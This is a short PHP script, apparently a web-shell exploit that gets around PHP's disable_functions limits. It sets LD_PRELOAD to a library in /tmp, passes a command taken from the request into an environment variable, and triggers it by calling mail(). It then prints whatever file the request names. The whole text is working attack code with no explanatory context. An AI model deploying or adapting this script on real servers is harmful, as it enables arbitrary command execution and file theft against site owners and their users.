<?php

putenv("LD_PRELOAD=/tmp/preload.so");
putenv('EVIL_CMD=' . $_GET['cmd']);
mail("","","");
echo file_get_contents($_GET['outpath']);